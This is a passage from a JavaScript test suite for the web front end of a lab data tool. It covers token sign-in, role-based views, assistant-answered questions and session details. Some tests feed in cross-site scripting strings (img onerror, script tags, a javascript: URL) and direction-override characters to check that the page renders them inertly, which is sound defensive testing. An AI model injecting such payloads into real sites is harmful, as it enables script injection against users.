  assert.deepStrictEqual(page.log.addresses[0], {how: 'replaceState', address: '/'});
  const first = page.log.requests[0];
  assert.strictEqual(first.method + ' ' + first.path, 'POST /api/v1/signin');
  assert.deepStrictEqual(first.body, {code: CODE});
  assert.strictEqual(first.headers.Authorization, undefined, 'the sign-in call carries no token');
  assert.strictEqual(first.hashThen, '', 'the code was already gone from the address');
  assert.strictEqual(page.window.sessionStorage.data['pcldb.token'], ADMIN_TOKEN);
  assert.strictEqual(page.log.requests[1].path, '/api/v1/me');
  assert.strictEqual(page.log.requests[1].headers.Authorization, 'Bearer ' + ADMIN_TOKEN);
  assert.ok(page.shown('view-app') && page.shown('panel-normal') && !page.shown('view-signin'));
  assert.strictEqual(page.window.location.hash, '#normal');
  assert.strictEqual(page.document.title, 'Normal - PCL data');
  assert.strictEqual(page.seen('user-name'), 'Local admin');
  assert.strictEqual(page.seen('user-role'), 'admin');
  assert.strictEqual(page.seen('user-initial'), 'L', 'the round mark shows the first letter of the name');
  assert.ok(page.shown('demo-chip'), 'the status said these are demo sessions');
  assert.ok(page.shown('tab-expert'), 'an admin may use Expert');
  audit(page);
});

test('a browser that refuses to change the address: the code is still replaced, not kept in the history', async function () {
  const page = await open({hash: '#signin=' + CODE, noReplaceState: true});
  assert.deepStrictEqual(page.log.addresses[0], {how: 'location.replace', address: '#'});
  assert.strictEqual(page.log.requests[0].hashThen, '');
  assert.ok(page.shown('view-app'));
  audit(page);
});

test('a sign-in link that was already used: a plain sentence and the form to paste a token', async function () {
  const page = await open({hash: '#signin=' + CODE, routes: {
    'POST /api/v1/signin': errorReply(401, 'unauthorized', 'This sign-in code was already used or is too old.')}});
  assert.ok(page.shown('view-signin') && !page.shown('view-app'));
  assert.strictEqual(page.seen('signin-note'), 'That sign-in link was already used or is more than five minutes old. ' +
    'Paste your access token below, or start again with: pcldb serve --open');
  assert.ok(page.byId('signin-note').classList.contains('banner-bad'));
  assert.strictEqual(page.window.location.hash, '');
  assert.deepStrictEqual(page.window.sessionStorage.data, {});
  assert.strictEqual(page.log.requests.length, 1, 'nothing else was asked');
  assert.strictEqual(page.document.activeElement, page.byId('signin-token'));
  audit(page);
});

test('a damaged sign-in link, a backend that is down, and a reply without a token', async function () {
  const damaged = await open({hash: '#signin=short'});
  assert.strictEqual(damaged.window.location.hash, '', 'even a damaged code leaves the address');
  assert.strictEqual(damaged.log.requests.length, 0);
  assert.ok(/^That sign-in link is not complete\. Paste your access token below/.test(damaged.seen('signin-note')));
  audit(damaged);

  const down = await open({hash: '#signin=' + CODE, routes: {'POST /api/v1/signin': NETWORK}});
  assert.ok(/^The backend is not reachable\. .* Paste your access token below/.test(down.seen('signin-note')));
  assert.deepStrictEqual(down.window.sessionStorage.data, {});
  audit(down);

  const odd = await open({hash: '#signin=' + CODE, routes: {
    'POST /api/v1/signin': {status: 200, body: {token: '<script>alert(1)</script>', user: {}}}}});
  assert.ok(/could not read/.test(odd.seen('signin-note')));
  assert.deepStrictEqual(odd.window.sessionStorage.data, {}, 'a token of the wrong shape is never kept');
  audit(odd);

  const slow = await open({hash: '#signin=' + CODE, routes: {'POST /api/v1/signin': HANG}});
  assert.strictEqual(slow.seen('boot-status'), 'Starting...');
  await slow.wait(30000);
  assert.ok(/^The backend did not answer in time\./.test(slow.seen('signin-note')));
  audit(slow);
});

test('pasting a token: checked, kept only when the backend accepts it, and gone from the field', async function () {
  const page = await open({});
  await page.type('signin-token', 'not a token');
  await page.click(page.byId('signin-submit'));
  assert.ok(/^That does not look like an access token\./.test(page.seen('signin-note')));
  assert.strictEqual(page.log.requests.length, 0, 'a value of the wrong shape is never sent');
  assert.strictEqual(page.byId('signin-token').value, '');

  await page.type('signin-token', 'pcl_' + 'wrong000'.repeat(5) + 'abc');
  await page.click(page.byId('signin-submit'));
  assert.ok(/^That token was not accepted\./.test(page.seen('signin-note')));
  assert.deepStrictEqual(page.window.sessionStorage.data, {});
  assert.ok(page.shown('view-signin'));
  assert.strictEqual(page.byId('signin-submit').disabled, false);

  await page.type('signin-token', '  ' + ADMIN_TOKEN + '\n');
  await page.click(page.byId('signin-submit'));
  assert.strictEqual(page.window.sessionStorage.data['pcldb.token'], ADMIN_TOKEN);
  assert.strictEqual(page.byId('signin-token').value, '', 'the token does not stay in the page');
  assert.ok(page.shown('view-app'));
  assert.strictEqual(page.document.activeElement, page.byId('normal-title'), 'the focus moves into the app');
  assert.strictEqual(page.window.location.hash, '#normal');
  audit(page);
});

test('a kept token is used on reload; when the backend answers 401 it is forgotten at once', async function () {
  let expired = false;
  const page = await open({token: ADMIN_TOKEN, routes: {
    'POST /api/v1/ask': function () { return expired ? errorReply(401, 'unauthorized', 'Sign in again.') : {status: 200, body: askReply()}; }}});
  assert.ok(page.shown('view-app'));
  assert.strictEqual(page.log.requests[0].path, '/api/v1/me');
  await page.type('ask-question', 'Which sessions have adenine?');
  await page.click(page.byId('ask-run'));
  assert.strictEqual(countOn(page), '3 sessions');
  expired = true;
  await page.click(page.byId('ask-run'));
  assert.deepStrictEqual(page.window.sessionStorage.data, {}, 'the token is removed on 401');
  assert.ok(page.shown('view-signin') && !page.shown('view-app'));
  assert.strictEqual(page.seen('signin-note'), 'Your sign-in has ended. Sign in again.');
  assert.strictEqual(page.seen('ask-results'), '', 'the last person\'s results are off the page');
  assert.strictEqual(page.byId('ask-question').value, '');
  assert.strictEqual(page.seen('user-name'), '');
  const before = page.log.requests.length;
  await page.wait(60000);
  assert.strictEqual(page.log.requests.length, before, 'nothing is asked after that');
  audit(page);
});

test('a kept token the backend no longer knows: straight to the sign-in form', async function () {
  const page = await open({token: 'pcl_' + 'gone0000'.repeat(5) + 'abc'});
  assert.ok(page.shown('view-signin'));
  assert.deepStrictEqual(page.window.sessionStorage.data, {});
  assert.strictEqual(page.seen('signin-note'), 'Your sign-in has ended. Sign in again.');
  const junk = await open({token: 'javascript:alert(1)'});
  assert.strictEqual(junk.log.requests.length, 0, 'a kept value of the wrong shape is never sent');
  audit(page);
  audit(junk);
});

test('Sign out forgets the token and everything the person saw', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', arcUser: 'demo-user'});
  await page.type('sql-text', 'SELECT path FROM sessions', 'input');
  await page.click(page.byId('sql-run'));
  assert.ok(/1 row in 12 ms/.test(page.seen('sql-result')));
  await page.click(page.byId('signout'));
  assert.deepStrictEqual(page.window.sessionStorage.data, {});
  assert.ok(page.shown('view-signin'));
  assert.strictEqual(page.seen('signin-note'), 'You are signed out.');
  ['sql-result', 'schema-list', 'history-list', 'status-cards', 'user-name', 'user-role', 'user-initial'].forEach(function (id) {
    assert.strictEqual(page.byId(id).textContent, '', id + ' was emptied');
  });
  assert.strictEqual(page.byId('sql-text').value, '');
  assert.strictEqual(page.byId('arc-user').value, '');
  assert.strictEqual(page.window.localStorage.data['pcldb.arc_user'], 'demo-user', 'the ARC user name stays in this browser');
  audit(page);
});

// ---- the three views and the role ---------------------------------------------------------------

test('a role without "sql": no Expert entry, a stale #expert or #sql falls back to Normal', async function () {
  for (const hash of ['#expert', '#sql']) {
    const page = await open({who: 'viewer', token: VIEWER_TOKEN, hash: hash});
    assert.strictEqual(page.window.location.hash, '#normal', hash);
    assert.ok(page.shown('panel-normal') && !page.shown('panel-expert'));
    assert.ok(!page.shown('tab-expert'), 'the Expert entry is not shown');
    assert.strictEqual(page.byId('tab-normal').getAttribute('aria-current'), 'page');
    assert.strictEqual(page.byId('tab-expert').getAttribute('aria-current'), null);
    await page.go('#expert');
    assert.strictEqual(page.window.location.hash, '#normal');
    assert.ok(!page.shown('panel-expert'));
    assert.strictEqual(page.log.requests.filter(function (request) { return request.path.indexOf('/api/v1/sql') === 0; }).length, 0,
      'no Expert address is ever asked for this role');
    assert.strictEqual(page.byId('lanes-you').textContent, 'You are viewer: Normal only');
    audit(page);
  }
});

test('the same tab, first an admin on Expert, then a viewer: Expert is gone', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#expert'});
  assert.ok(page.shown('panel-expert') && page.shown('tab-expert'));
  assert.strictEqual(page.document.title, 'Expert - PCL data');
  assert.strictEqual(page.byId('lanes-you').textContent, 'You are admin: Normal and Expert');
  await page.click(page.byId('signout'));
  assert.strictEqual(page.window.location.hash, '#expert', 'the address still names Expert');
  await page.type('signin-token', VIEWER_TOKEN);
  await page.click(page.byId('signin-submit'));
  assert.ok(page.shown('view-app') && page.shown('panel-normal') && !page.shown('panel-expert') && !page.shown('tab-expert'));
  assert.strictEqual(page.window.location.hash, '#normal');
  assert.strictEqual(page.seen('schema-list'), '', 'nothing of the admin\'s Expert view is left');
  assert.strictEqual(page.seen('user-role'), 'viewer');
  audit(page);
});

test('the three views: the address, the title, the mark and the focus follow', async function () {
  const page = await open({token: ADMIN_TOKEN});
  assert.strictEqual(page.window.location.hash, '#normal');
  await page.click(page.byId('tab-expert'));
  assert.ok(page.shown('panel-expert') && !page.shown('panel-normal') && !page.shown('panel-status'));
  assert.strictEqual(page.document.title, 'Expert - PCL data');
  assert.strictEqual(page.byId('tab-expert').getAttribute('aria-current'), 'page');
  assert.strictEqual(page.byId('tab-normal').getAttribute('aria-current'), null);
  assert.strictEqual(page.document.activeElement, page.byId('expert-title'));
  assert.strictEqual(page.paths('GET /api/v1/sql/schema').length, 1);
  await page.click(page.byId('tab-status'));
  assert.ok(page.shown('panel-status') && !page.shown('panel-expert'));
  assert.strictEqual(page.document.title, 'Status - PCL data');
  await page.click(page.byId('tab-expert'));
  assert.strictEqual(page.paths('GET /api/v1/sql/schema').length, 1, 'the list of tables is loaded once');
  // An address that names no view keeps the view and is put right; no entry is added to the history.
  await page.go('#nonsense');
  assert.strictEqual(page.window.location.hash, '#expert');
  assert.ok(page.log.addresses.every(function (entry) { return entry.how === 'replaceState'; }));
  // Reloading on a view comes back to it.
  const again = await open({token: ADMIN_TOKEN, hash: '#status'});
  assert.ok(again.shown('panel-status'));
  assert.strictEqual(again.window.location.hash, '#status');
  audit(page);
  audit(again);
});

test('a sign-in link opened while someone is signed in: the code leaves the address and signs in again', async function () {
  const page = await open({token: VIEWER_TOKEN, who: 'viewer'});
  assert.strictEqual(page.seen('user-role'), 'viewer');
  await page.go('#signin=' + CODE);
  assert.strictEqual(page.paths('POST /api/v1/signin').length, 1);
  assert.strictEqual(page.paths('POST /api/v1/signin')[0].hashThen, '');
  assert.strictEqual(page.window.sessionStorage.data['pcldb.token'], VIEWER_TOKEN);
  assert.strictEqual(page.window.location.hash, '#normal');
  audit(page);
});

// ---- Normal: a question -------------------------------------------------------------------------

test('Normal: a question, the answer of the assistant, how it was searched, the table', async function () {
  const page = await open({token: ADMIN_TOKEN});
  await page.click(page.button('ask-examples', 'Adenine sessions'));
  const sent = page.paths('POST /api/v1/ask')[0];
  assert.deepStrictEqual(sent.body, {question: 'Which sessions have adenine?', include_simulated: true});
  assert.deepStrictEqual(Object.keys(sent.headers).sort(), ['Accept', 'Authorization', 'Content-Type']);
  const text = page.seen('ask-results');
  ['Written by the ARC assistant. Check it against the table.', '3 sessions match.', 'Details', 'How this was searched',
    'Sessions where labels has adenine, newest first (up to 10).', 'Question read by assistant',
    "Searched in this computer's copy of the index", 'Exact request',
    'Session Instrument Started Labels State', 'simulated', 'UNKNOWN (4), adenine (3)',
    'complete', 'needs review (1)'].forEach(function (needle) {
    assert.ok(text.indexOf(needle) !== -1, 'missing: ' + needle + '\n' + text);
  });
  assert.ok(text.indexOf('Globus Search') === -1, 'the search ran on this computer: the page must not name Globus Search');
  assert.strictEqual(countOn(page), '3 sessions');
  assert.ok(page.byId('panel-normal').classList.contains('is-compact'), 'after a question the search box moves up');
  assert.strictEqual(text.split('Sessions where labels has adenine').length, 2, 'the reading is said once, not in Details again');
  assert.ok(page.shown('ask-hint'), 'sessions are listed: the hint says how to reach their files');
  // "How this was searched" and the exact request wait behind one closed "Details" toggle.
  const details = page.byId('ask-results').querySelectorAll('details');
  assert.strictEqual(details.length, 1);
  assert.strictEqual(details[0].open, false);
  assert.strictEqual(seen(details[0].querySelectorAll('summary')[0]), 'Details');
  assert.ok(seen(details[0]).indexOf('How this was searched') !== -1 && details[0].querySelectorAll('pre').length === 1);
  assert.strictEqual(page.byId('ask-results').querySelectorAll('tr').length, 4);
  assert.strictEqual(page.byId('ask-results').querySelectorAll('time')[0].getAttribute('title'), '2026-11-16T03:50:15Z (UTC)');
  assert.strictEqual(page.byId('ask-run').disabled, false);
  assert.ok(!page.shown('ask-cancel'));
  // The box stays unticked when the person unticks it, and that is what is sent.
  page.byId('ask-simulated').checked = false;
  await page.click(page.byId('ask-run'));
  assert.strictEqual(page.paths('POST /api/v1/ask')[1].body.include_simulated, false);
  audit(page);
});

test('Normal: the example chips show a few words and ask the same five questions as before', async function () {
  const questions = ['Which sessions have adenine?', 'Show Raman sessions from the last 7 days', 'How many sessions per instrument?',
    'Which sessions still need review?', 'Which sessions were partial or failed?'];
  const page = await open({token: ADMIN_TOKEN});
  const chips = page.byId('ask-examples').querySelectorAll('button');
  assert.strictEqual(chips.length, questions.length);
  for (let i = 0; i < chips.length; i += 1) {
    assert.ok(seen(chips[i]).split(' ').length <= 4, 'a chip has a few words: ' + seen(chips[i]));
    await page.click(chips[i]);
    assert.deepStrictEqual(page.paths('POST /api/v1/ask')[i].body, {question: questions[i], include_simulated: true});
    assert.strictEqual(page.byId('ask-question').value, questions[i], 'the whole question is in the box');
  }
  audit(page);
});

test('the session panel: key facts first, the long parts behind toggles, SSH commands open only from Expert', async function () {
  const made = await openFromNormal({});
  const body = made.page.byId('detail-body');
  const facts = body.querySelectorAll('dl').filter(function (list) { return list.className === 'keyfacts'; });
  assert.strictEqual(facts.length, 1);
  assert.strictEqual(seen(facts[0]), 'Instrument raman-portable Started ' +
    seen(facts[0].querySelectorAll('time')[0]) + ' Method 1d_y_scan Samples 130 Items 13 of 13 Size 184 kB, 2 files');
  const folds = body.querySelectorAll('details').filter(function (node) { return node.className === 'fold'; });
  assert.deepStrictEqual(folds.map(function (node) { return seen(node.querySelectorAll('summary')[0]); }),
    ['All fields', 'Runs (1)', 'Files (2)']);
  assert.ok(folds.every(function (node) { return !node.open; }), 'all of them start closed');
  // "Open in Globus" comes first and is the main button.
  const actions = body.querySelectorAll('section').filter(function (node) { return node.className === 'actions'; })[0];
  const first = actions.querySelectorAll('a')[0];
  assert.strictEqual(first.className, 'btn btn-primary');
  audit(made.page);

  const expert = await openFromExpert({});
  const ssh = expert.page.byId('detail-body').querySelectorAll('details').filter(function (node) {
    return seen(node.querySelectorAll('summary')[0]) === 'SSH commands';
  });
  assert.strictEqual(ssh.length, 1);
  assert.strictEqual(ssh[0].open, true, 'from Expert the commands are what the person came for');
  audit(expert.page);
  const status = await open({token: ADMIN_TOKEN, hash: '#status'});
  await status.click(status.button('status-registrations', 'demo_1'));
  const closed = status.byId('detail-body').querySelectorAll('details').filter(function (node) {
    return seen(node.querySelectorAll('summary')[0]) === 'SSH commands';
  });
  assert.strictEqual(closed.length, 1);
  assert.strictEqual(closed[0].open, false);
  audit(status);
});

test('Expert: Cancel shows only while a query runs; the list of tables starts open on a wide screen only', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {'POST /api/v1/sql': HANG}});
  assert.ok(!page.shown('sql-cancel'), 'nothing to cancel yet');
  assert.strictEqual(page.byId('schema-panel').getAttribute('open'), null, 'without matchMedia it stays closed');
  await page.type('sql-text', 'SELECT 1', 'input');
  await page.click(page.byId('sql-run'));
  assert.ok(page.shown('sql-cancel'));
  await page.click(page.byId('sql-cancel'));
  assert.ok(!page.shown('sql-cancel'));
  audit(page);
  const wide = await open({token: ADMIN_TOKEN, hash: '#expert', wide: true});
  assert.strictEqual(wide.byId('schema-panel').getAttribute('open'), '');
  const narrow = await open({token: ADMIN_TOKEN, hash: '#expert', wide: false});
  assert.strictEqual(narrow.byId('schema-panel').getAttribute('open'), null);
  audit(wide);
  audit(narrow);
});

test('Normal: Globus Search named only when it ran; keyword rules; notices; counts', async function () {
  const page = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': {status: 200, body: askReply({
    answer: null, answer_by: 'none', planned_by: 'rules', backend: 'globus',
    notices: ['The ARC LLM service only answers on the VT campus network or VPN. This question was answered by the keyword rules instead.'],
    facets: [{name: 'instrument', field_name: 'instrument', buckets: [{value: 'raman-portable', count: 12}, {value: 'jeol-jsm-it800-shl', count: 4}]},
      {name: 'simulated', field_name: 'simulated', buckets: [{value: true, count: 2}, {value: false, count: 1}]}]})}}});
  await page.type('ask-question', 'How many sessions per instrument?');
  await page.click(page.byId('ask-run'));
  const text = page.seen('ask-results');
  assert.ok(text.indexOf('Question read by keyword rules') !== -1);
  assert.ok(text.indexOf('Searched in Globus Search') !== -1);
  assert.ok(text.indexOf('Written by the ARC assistant') === -1, 'no answer: nothing is said to be written by the assistant');
  assert.ok(text.indexOf('This question was answered by the keyword rules instead.') !== -1);
  assert.ok(text.indexOf('Sessions by instrument') !== -1 && text.indexOf('raman-portable 12') !== -1);
  assert.ok(text.indexOf('Sessions by simulated or not') !== -1 && text.indexOf('yes 2') !== -1 && text.indexOf('no 1') !== -1);
  audit(page);
});

test('Normal: nothing matched, and a count without a list', async function () {
  const none = {status: 200, body: askReply({answer: 'No sessions matched this question.', answer_by: 'none', total: 0, count: 0, results: []})};
  const page = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': none}});
  await page.type('ask-question', 'nothing');
  await page.click(page.byId('ask-run'));
  let text = page.seen('ask-results');
  // The same place as with results: the summary line and Details first, then the empty card.
  assert.ok(/^No sessions matched Sessions where labels has adenine, newest first \(up to 10\)\. Details How this was searched .* Try other words, or a wider time span\.$/.test(text), text);
  assert.strictEqual(text.split('No sessions matched').length, 2, 'said once, not twice');
  assert.strictEqual(text.split('Sessions where labels has adenine').length, 2, 'the reading is said once, not twice');
  assert.ok(!page.shown('ask-hint'), 'nothing to open: no hint about opening a session');
  page.byId('ask-simulated').checked = false;
  await page.click(page.byId('ask-run'));
  assert.ok(page.seen('ask-results').indexOf('Simulated sessions were left out. Turn on "Include simulated" to search them.') !== -1);

  const counted = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': {status: 200, body: askReply({answer: null, answer_by: 'none', total: 5, count: 0, results: []})}}});
  await counted.type('ask-question', 'count');
  await counted.click(counted.byId('ask-run'));
  text = counted.seen('ask-results');
  assert.ok(/^5 sessions matched, but none is listed here .*Details How this was searched .* Details shows how the question was read\.$/.test(text), text);
  assert.ok(text.indexOf('No sessions matched') === -1);
  audit(page);
  audit(counted);
});

test('Normal: a reply with nearly everything missing does not break the page', async function () {
  const replies = [
    {},
    {results: null, facets: null, notices: null, total: null, timing_ms: null, request: null},
    {question: 'x', answer: null, answer_by: 'none', planned_by: 'rules', interpretation: '', request: {}, backend: 'local',
      notices: [], total: 3, count: 3, facets: [], timing_ms: {},
      results: [{subject: 'urn:pcl:dataset:a'}, {subject: 'urn:pcl:dataset:b', path: 'raw/x/only_a_path'},
        {subject: 'urn:pcl:dataset:c', folder: 'a_folder_without_a_path', simulated: false, started: 'not a time'}]},
    {results: 'many', facets: 'some', notices: 'one', total: 'three', answer: 7, timing_ms: 'fast'},
    {results: [null, 5, 'text', [], {}], facets: [null, 5, 'text', [], {}, {buckets: 'none'}, {buckets: [null, 5, {}]}]}
  ];
  for (const body of replies) {
    const page = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': {status: 200, body: body}}});
    await page.type('ask-question', 'anything');
    await page.click(page.byId('ask-run'));
    assert.ok(page.seen('ask-results').indexOf('How this was searched') !== -1, JSON.stringify(body));
    assert.strictEqual(page.byId('ask-run').disabled, false);
    audit(page);
  }
  const sparse = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': {status: 200, body: replies[2]}}});
  await sparse.type('ask-question', 'anything');
  await sparse.click(sparse.byId('ask-run'));
  const text = sparse.seen('ask-results');
  assert.strictEqual(countOn(sparse), '3 sessions');
  assert.ok(text.indexOf('(no name)') !== -1 && text.indexOf('only_a_path') !== -1 && text.indexOf('a_folder_without_a_path') !== -1);
  assert.ok(text.indexOf('The backend did not say how it read the question.') !== -1);
  assert.strictEqual(sparse.buttons('ask-results', 'only_a_path').length, 1, 'a session with a path can be opened');
  assert.strictEqual(sparse.buttons('ask-results', 'a_folder_without_a_path').length, 0, 'one without a path cannot');
});

test('Normal: hostile text everywhere is shown as text, cut to size, with unseen characters written out', async function () {
  const hostile = entry(1, {
    folder: 'evil_' + RLO + 'gpj.exe_<img src=x onerror=alert(3)>', title: EVIL, instrument: EVIL, completion: '<b>failed</b>',
    sample_ids: [EVIL, '130' + RLO + '731', 'a'.repeat(3000)], labels: [EVIL], label_counts: [{label: EVIL + RLO, count: 3}],
    review_state: EVIL, started: '<b>yesterday</b>', path: 'raw/x/evil_' + RLO + '"><script>'
  });
  const page = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': {status: 200, body: askReply({
    answer: 'Hostile ' + EVIL + '\n' + RLO + 'reversed\n' + LONG, interpretation: EVIL + ' ' + LONG, planned_by: EVIL, backend: EVIL + RLO,
    notices: [EVIL, 'second ' + RLO, LONG, 7, null].concat(new Array(30).fill('many notices')),
    request: {q: EVIL, values: [RLO, LONG]}, results: [hostile, entry(2, {folder: 'x'.repeat(100000)})],
    facets: [{name: EVIL, field_name: EVIL + RLO, buckets: [{value: EVIL, count: 3}, {value: LONG, count: 'many' + RLO}]}],
    timing_ms: {plan: EVIL}, total: 2, count: 2})}}});
  await page.type('ask-question', 'hostile');
  await page.click(page.byId('ask-run'));
  const box = page.byId('ask-results');
  const text = page.seen('ask-results');
  assert.ok(text.indexOf('<img src=x onerror=alert(1)>') !== -1, 'markup is shown as the text it is');
  assert.ok(text.indexOf('evil_<U+202E>gpj.exe') !== -1, 'the direction override is written out');
  assert.ok(text.indexOf(RLO) === -1);
  ['img', 'script', 'b', 'a', 'iframe', 'svg'].forEach(function (tag) {
    assert.strictEqual(madeFromText(page, box, tag).length, 0, 'a <' + tag + '> element was made from text');
  });
  assert.ok(text.length < 60000, 'about 500 kB came in, ' + text.length + ' characters are on the page');
  assert.ok(box.querySelectorAll('p').filter(function (p) { return p.className === 'banner'; }).length <= 10);
  assert.ok(box.querySelectorAll('p').filter(function (p) { return p.className === 'answer-text'; })[0].textContent.length <= 6100);
  assert.ok(page.buttons('ask-results', 'x'.repeat(100)).every(function (button) { return button.textContent.length <= 121; }));
  audit(page);
});

test('Normal: a slow answer can be cancelled, a second click does not ask twice, a stalled backend ends', async function () {
  const page = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': HANG}});
  await page.type('ask-question', 'slow');
  await page.click(page.byId('ask-run'));
  assert.strictEqual(page.byId('ask-run').disabled, true);
  assert.ok(page.shown('ask-cancel'));
  assert.ok(/^Working on it\./.test(page.seen('ask-status')));
  assert.strictEqual(page.byId('ask-results').getAttribute('aria-busy'), 'true');
  assert.ok(page.byId('ask-examples').querySelectorAll('button').every(function (button) { return button.disabled; }));
  await page.click(page.byId('ask-run'));
  await page.click(page.button('ask-examples', 'Adenine sessions'));
  assert.strictEqual(page.paths('POST /api/v1/ask').length, 1, 'one question at a time');
  await page.wait(3000);
  assert.strictEqual(page.seen('ask-elapsed'), '3 s');
  await page.click(page.byId('ask-cancel'));
  assert.strictEqual(page.seen('ask-status'), 'Cancelled.');
  assert.strictEqual(page.paths('POST /api/v1/ask')[0].stopped, true, 'the request itself was ended');
  assert.strictEqual(page.byId('ask-run').disabled, false);
  assert.ok(!page.shown('ask-cancel'));
  assert.strictEqual(page.seen('ask-elapsed'), '');
  // Nobody cancels: the page gives up by itself after five minutes and says so.
  await page.click(page.byId('ask-run'));
  await page.wait(299000);
  assert.ok(/^Working on it\./.test(page.seen('ask-status')));
  await page.wait(1000);
  assert.ok(/^The backend did not answer in time\./.test(page.seen('ask-status')));
  assert.ok(page.byId('ask-status').classList.contains('is-bad'));
  assert.strictEqual(page.byId('ask-run').disabled, false);
  assert.strictEqual(page.timers.size, 0, 'no timer is left running');
  audit(page);
});

test('Normal: the view can be left while a question runs; the answer is there on return', async function () {
  let answerNow = null;
  const page = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': function () {
    return new Promise(function (resolve) { answerNow = function () { resolve({status: 200, body: askReply()}); }; });
  }}});
  await page.type('ask-question', 'slow');
  await page.click(page.byId('ask-run'));
  await page.click(page.byId('tab-status'));
  assert.ok(page.shown('panel-status') && !page.shown('panel-normal'));
  answerNow();
  await page.settle();
  assert.ok(page.shown('panel-status'), 'the answer does not pull the person back');
  await page.click(page.byId('tab-normal'));
  assert.strictEqual(countOn(page), '3 sessions');
  assert.strictEqual(page.byId('ask-run').disabled, false);
  audit(page);
});

test('Normal: each kind of failure gives a plain sentence', async function () {
  const cases = [
    [errorReply(429, 'ask_rate_limited', 'At most 20 questions a minute for each person.', {retry_after_s: 37}),
      /^Too many requests in a short time\. Wait about 37 seconds, then try again\. The backend said: At most 20 questions/],
    [errorReply(403, 'forbidden', 'Asking is switched off.'), /^Your role \(admin\) may not ask questions\. The backend said: Asking is switched off\.$/],
    [errorReply(500, 'error', 'Something went wrong on the server.'), /^The backend could not do this\. It said: Something went wrong on the server\.$/],
    [errorReply(400, 'bad_question', 'The question must have 1 to 500 characters.'), /^The question must have 1 to 500 characters\.$/],
    [errorReply(413, 'too_large', ''), /^That is too large for the backend to accept\./],
    [{status: 502, type: 'text/html', body: '<h1>Bad gateway</h1>'}, /^The backend is not reachable or stopped answering\./],
    [{status: 200, type: 'text/html', body: '<script>alert(9)</script>'}, /^The backend sent a reply this page could not read\./],
    [{status: 200, body: {}, notJson: true}, /^The backend sent a reply this page could not read\./],
    [{status: 200, body: 'just text'}, /^The backend sent a reply this page could not read\./],
    [NETWORK, /^The backend is not reachable\. Check that "pcldb serve" is still running, then try again\.$/],
    [errorReply(400, 'bad_question', EVIL + RLO + LONG), /^<img src=x onerror=alert\(1\)>.*<U\+202E>long text/]
  ];
  for (const item of cases) {
    const page = await open({token: ADMIN_TOKEN, routes: {'POST /api/v1/ask': item[0]}});
    await page.type('ask-question', 'anything');
    await page.click(page.byId('ask-run'));
    assert.ok(item[1].test(page.seen('ask-status')), page.seen('ask-status').slice(0, 200));
    assert.ok(page.seen('ask-status').length < 4300);
    assert.ok(page.byId('ask-status').classList.contains('is-bad'));
    assert.strictEqual(page.seen('ask-results'), '');
    assert.strictEqual(page.byId('ask-run').disabled, false);
    audit(page);
  }
  const empty = await open({token: ADMIN_TOKEN});
  await empty.click(empty.byId('ask-run'));
  assert.strictEqual(empty.seen('ask-status'), 'Type a question first.');
  assert.strictEqual(empty.paths('POST /api/v1/ask').length, 0);
});

// ---- the detail panel and the files, by mode ------------------------------------------------------

async function openFromNormal(options) {
  const page = await open(Object.assign({token: ADMIN_TOKEN}, options));
  await page.type('ask-question', 'adenine');
  await page.click(page.byId('ask-run'));
  const name = page.byId('ask-results').querySelectorAll('button').filter(function (button) { return button.className === 'rowlink'; })[0];
  await page.click(name);
  return {page: page, opener: name};
}

test('the detail panel from Normal: every field, how it got to ARC, and the Globus actions only', async function () {
  const made = await openFromNormal({arcUser: 'demo-user'});
  const page = made.page;
  const asked = page.paths('GET /api/v1/session')[0];
  assert.strictEqual(asked.path, '/api/v1/session?path=raw%2Framan-portable%2Fsimulated%2F1d_y_scan_20261116_225015_281');
  assert.strictEqual(asked.body, undefined);
  assert.strictEqual(page.log.modal, 1, 'it opens as a dialog that keeps the keyboard inside');
  assert.ok(page.byId('detail').open);
  assert.strictEqual(page.seen('detail-title'), '1d_y_scan_20261116_225015_281');
  const text = page.seen('detail-body');
  ['Get to the files', 'Through Globus', 'Open in Globus (opens the Globus web app in a new tab)', 'Copy Globus address',
    'Globus address: globus://' + COLLECTION + '/pcl_photonics/raw/', 'Session', 'Folder', 'Times', 'Sample and notes',
    'How it got to ARC', 'Sent with Globus Transfer', 'Copy on ARC confirmed yes',
    'How it was checked Globus gave a checksum for every file, and each one matched', 'Upload id u000000000006',
    'Where the files are', 'ARC path /projects/pcl_photonics/raw/', 'Record keeping', 'Labels', 'UNKNOWN 4',
    '1 point still needs review.', 'Runs', 'classify', 'Files', '2 files', 'pcl_session.json', '1.5 kB', 'not listed'
  ].forEach(function (needle) {
    assert.ok(text.indexOf(needle) !== -1, 'missing: ' + needle + '\n' + text);
  });
  // The actions of the other mode are not offered here.
  ['Over SSH', 'Copy ARC path', 'scp', 'sftp', 'rsync', 'YOUR_ARC_USERNAME', 'demo-user@'].forEach(function (needle) {
    assert.ok(text.indexOf(needle) === -1, 'Normal mode must not show: ' + needle);
  });
  const links = page.byId('detail-body').querySelectorAll('a');
  assert.strictEqual(links.length, 1, 'one link: Open in Globus');
  assert.strictEqual(links[0].href, 'https://app.globus.org/file-manager?origin_id=' + COLLECTION +
    '&origin_path=%2Fpcl_photonics%2Fraw%2Framan-portable%2Fsimulated%2F1d_y_scan_20261116_225015_281%2F');
  assert.strictEqual(links[0].target, '_blank');
  assert.strictEqual(links[0].rel, 'noopener noreferrer');
  await page.click(page.button('detail-body', 'Copy Globus address'));
  assert.deepStrictEqual(page.log.copied, ['globus://' + COLLECTION + '/pcl_photonics/raw/raman-portable/simulated/1d_y_scan_20261116_225015_281/']);
  assert.ok(text.indexOf('Copied') === -1 && page.seen('detail-body').indexOf('Copied the address.') !== -1);
  // Every column of the session row is on the page exactly once.
  const labels = page.byId('detail-body').querySelectorAll('dt').map(function (node) { return node.textContent; });
  assert.strictEqual(labels.filter(function (label) { return label === 'Upload'; }).length, 1);
  assert.strictEqual(page.byId('detail-body').querySelectorAll('dl').filter(function (list) { return list.className === 'fields'; })
